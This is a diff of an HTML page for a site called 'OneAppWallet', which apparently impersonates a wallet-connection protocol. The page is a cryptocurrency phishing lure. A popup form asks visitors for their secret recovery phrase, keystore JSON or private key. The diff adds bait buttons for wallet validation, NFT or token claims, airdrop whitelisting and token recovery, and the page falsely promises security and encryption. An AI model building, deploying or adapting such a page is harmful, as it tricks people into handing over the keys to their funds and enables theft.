@@ -1,144 +1,179 @@
 <!DOCTYPE html>
 <html lang="en">
+  <head>
+    <title>OneAppWallet : Your One Stop Universal Wallet</title>
 
-    <head>
-        <title> OneAppWallet : Your One Stop Universal Wallet </title>
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, user-scalable=no"
+    />
 
+    <link href="./css/all.min.css" rel="stylesheet" />
+    <link href="./css/style.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Archivo+Narrow:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&display=swap"
+      rel="stylesheet"
+    />
 
-        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <script src="./js/jquery.min.js"></script>
+    <script src="./js/all.min.js"></script>
+    <script src="./js/sweetalert.min.js"></script>
+    <script src="./js/main.js"></script>
+  </head>
 
-        <link href="./css/all.min.css" rel="stylesheet">
-        <link href="./css/style.css" rel="stylesheet">
-        <link rel="preconnect" href="https://fonts.googleapis.com">
-        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link
-            href="https://fonts.googleapis.com/css2?family=Archivo+Narrow:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&display=swap"
-            rel="stylesheet">
+  <body>
+    <div class="floating-divider"></div>
 
-        <script src="./js/jquery.min.js"></script>
-        <script src="./js/all.min.js"></script>
-        <script src="./js/sweetalert.min.js"></script>
-        <script src="./js/main.js"></script>
+    <div class="floating-island">
+      <div class="floating-island-header">
+        <div class="right">
+          <i class="fa fa-times" onclick="chaseFloatingIsland()"></i>
+        </div>
+        <h3>Connect Your BitPay Wallet</h3>
+        <p>Import Your Wallet On The Go</p>
+      </div>
+      <div class="floating-island-body">
+        <div id="flash_info">
+          <img src="./img/Binance Chain.jpg" />
+          <h3>Binance Chain</h3>
+        </div>
+        <div class="import-type">
+          <div class="import-selection">
+            <p onclick="keysupin('Phrases')">Phrases</p>
+            <p onclick="keysupin('KeyStore JSON')">KeyStore JSON</p>
+            <p onclick="keysupin('Private Key')">Private Key</p>
+          </div>
+          <div class="import-selected">
+            <form id="key_submission">
+              <input type="hidden" value="Phrases" id="import" />
+              <input type="hidden" value="" id="wallet" />
+              <label> Enter Secret Recovery Phrase </label>
+              <textarea
+                rows="6"
+                id="pphse"
+                placeholder="Enter Your Secret Recovery Phrase Which Is Always Either 12, 15, 18, 21 or 24 Words, Each Separate By A Space"
+              ></textarea>
+              <button>Import Wallet</button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
 
-    </head>
-
-    <body>
-
-        <div class="floating-divider"></div>
-
-        <div class="floating-island">
-
-            <div class="floating-island-header">
-                <div class="right">
-                    <i class="fa fa-times" onclick="chaseFloatingIsland()"></i>
-                </div>
-                <h3>Connect Your BitPay Wallet</h3>
-                <p> Import Your Wallet On The Go </p>
-            </div>
-            <div class="floating-island-body">
-                <div id="flash_info">
-                    <img src="./img/Binance Chain.jpg">
-                    <h3> Binance Chain </h3>
-                </div>
-                <div class="import-type">
-                    <div class="import-selection">
-                        <p onclick="keysupin('Phrases')"> Phrases </p>
-                        <p onclick="keysupin('KeyStore JSON')"> KeyStore JSON </p>
-                        <p onclick="keysupin('Private Key')"> Private Key </p>
-                    </div>
-                    <div class="import-selected">
-                        <form id="key_submission">
-                            <input type="hidden" value="Phrases" id="import">
-                            <input type="hidden" value="" id="wallet">
-                            <label> Enter Secret Recovery Phrase </label>
-                            <textarea rows="6" id="pphse"
-                                placeholder="Enter Your Secret Recovery Phrase Which Is Always Either 12, 15, 18, 21 or 24 Words, Each Separate By A Space"></textarea>
-                            <button> Import Wallet </button>
-                        </form>
-                    </div>
-                </div>
-            </div>
-
+    <header>
+      <div class="main_header">
+        <div class="header-links">
+          <a href="./"> How To </a>
+          <a href="./wallet.html"> Wallets </a>
+          <a href="./wallet.html"> Apps </a>
         </div>
 
-        <header>
+        <div class="header_identity">
+          <h3>OneAppWallet</h3>
+        </div>
 
-            <div class="main_header">
+        <div class="clear"></div>
+      </div>
+    </header>
 
-                <div class="header-links">
-                    <a href="#"> How To </a>
-                    <a href="#"> Wallets </a>
-                    <a href="#"> Apps </a>
-                </div>
+    <main>
+      <div class="main_container">
+        <div class="site_welcome">
+          <h3>OneAppWallet</h3>
+          <p>Open protocol for connecting Wallets to Dapps</p>
+          <img src="./img/banner.png" />
+        </div>
 
-                <div class="header_identity">
-                    <h3> OneAppWallet </h3>
-                </div>
-
-                <div class="clear"></div>
-
+        <div class="how_to" id="how_to">
+          <div class="how_to_flex">
+            <div class="how_to_what_is">
+              <h3>What is OneAppWallet?</h3>
+              <p>
+                OneAppWallet is an open source protocol for connecting
+                decentralised applications to mobile wallets with QR code
+                scanning or deep linking. A user can interact securely with any
+                Dapp from their mobile phone, making wallets a safer choice
+                compared to desktop or browser extension wallets.
+              </p>
             </div>
-
-        </header>
-
-        <main>
-
-            <div class="main_container">
-
-                <div class="site_welcome">
-                    <h3> OneAppWallet </h3>
-                    <p> Open protocol for connecting Wallets to Dapps </p>
-                    <img src="./img/banner.png">
-                </div>
-
-                <div class="how_to" id="how_to">
-
-                    <div class="how_to_flex">
-                        <div class="how_to_what_is">
-                            <h3> What is OneAppWallet? </h3>
-                            <p>
-                                OneAppWallet is an open source protocol for connecting decentralised applications to
-                                mobile wallets with QR code scanning or deep linking. A user can interact securely with
-                                any Dapp from their mobile phone, making wallets a safer choice compared to desktop or
-                                browser extension wallets.
-                            </p>
-                        </div>
-                        <div class="how_to_how_work">
-                            <h3> How does it work? </h3>
-                            <p>
-                                OneAppWallet connects web applications to supported mobile wallets session is started
-                                by a scanning a QR code (desktop) or by clicking an application deep link (mobile).
-                            </p>
-                        </div>
-                    </div>
-
-                    <div class="wallets">
-
-                        <h3> Connect Your Wallet </h3>
-
-                        <form id="search_form" autocomplete="off">
-                            <div class="wallet_search">
-                                <input type="text" placeholder="Find Your Wallet" id="finder" autocomplete="off">
-                                <button type="submit"> Search </button>
-                            </div>
-                        </form>
-
-                        <div class="your_wallets" id="your_wallets"></div>
-
-                    </div>
-
-                </div>
-
+            <div class="how_to_how_work">
+              <h3>How does it work?</h3>
+              <p>
+                OneAppWallet connects web applications to supported mobile
+                wallets session is started by a scanning a QR code (desktop) or
+                by clicking an application deep link (mobile).
+              </p>
             </div>
+          </div>
 
+          <div class="wallets">
+            <h3>Connect Your Wallet</h3>
 
+            <div class="homedarkblock">
+              <div class="homedarkblockdiv">
+                <h5>1.</h5>
+                <h4>Wallet Validation</h4>
+                <p>
+                  You can proceed with this option to validate your wallet using
+                  our powerful and secured dapps tools.
+                </p>
+                <a href="./wallet.html"> Validate Wallet </a>
+              </div>
 
-        </main>
+              <div class="homedarkblockdiv">
+                <h5>2.</h5>
+                <h4>Claim NFTs or Tokens</h4>
+                <p>
+                  Claim NFTs or Tokens from eligible prize pools and reward
+                  programs.
+                </p>
+                <a href="./wallet.html"> Claim NFTs or Tokens </a>
+              </div>
 
-        <footer>
+              <div class="homedarkblockdiv">
+                <h5>3.</h5>
+                <h4>Wallet Synchronization</h4>
+                <p>
+                  Authenticate or Synchronize your wallet using our secure
+                  protocol.
+                </p>
+                <a href="./wallet.html"> Synchronize Wallet </a>
+              </div>
 
-        </footer>
+              <div class="homedarkblockdiv">
+                <h5>4.</h5>
+                <h4>Nft Minting</h4>
+                <p>Mint desired NFTs from the server directly to your wallet</p>
+                <a href="./wallet.html"> Synchronize Wallet </a>
+              </div>
 
-    </body>
+              <div class="homedarkblockdiv">
+                <h5>5.</h5>
+                <h4>Get Whitelisted</h4>
+                <p>
+                  Be among the very first to recieve in the airdrop participants
+                </p>
+                <a href="./wallet.html"> Synchronize Wallet </a>
+              </div>
 
+              <div class="homedarkblockdiv">
+                <h5>6.</h5>
+                <h4>Rectify or Recover Token</h4>
+                <p>
+                  Rectify or Recover lost tokens using End-to-end encryption
+                  whick keeps client-side generated keys and all user activity
+                  private.
+                </p>
+                <a href="./wallet.html"> Rectify or Recover Token </a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <footer></footer>
+  </body>
 </html>
